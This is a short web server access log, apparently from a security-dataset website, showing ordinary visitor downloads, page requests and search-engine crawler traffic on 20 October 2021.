219.74.97.4 - - [20/Oct/2021:07:06:15 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 195929080 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:06:15 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 206 182407511 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:06:15 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 206 189504462 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
194.187.171.79 - - [20/Oct/2021:07:08:00 -0700] "GET /favicon.ico HTTP/1.1" 200 347 "-" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)" 
194.187.171.94 - - [20/Oct/2021:07:08:00 -0700] "GET / HTTP/1.1" 200 13139 "-" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)" 
194.187.171.84 - - [20/Oct/2021:07:08:00 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 669 "-" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)" 
114.119.149.89 - - [20/Oct/2021:07:11:21 -0700] "GET /self.logs/2015/error.log.2015-08-14.gz HTTP/1.1" 200 3274 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
135.181.217.184 - - [20/Oct/2021:07:12:10 -0700] "GET / HTTP/1.1" 200 13183 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)" 
114.119.135.212 - - [20/Oct/2021:07:21:40 -0700] "GET /self.logs/error.log.2018-10-12.gz HTTP/1.1" 200 4217 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
219.74.97.4 - - [20/Oct/2021:07:23:39 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:23:40 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:23:40 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:23:40 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:23:41 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:23:53 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
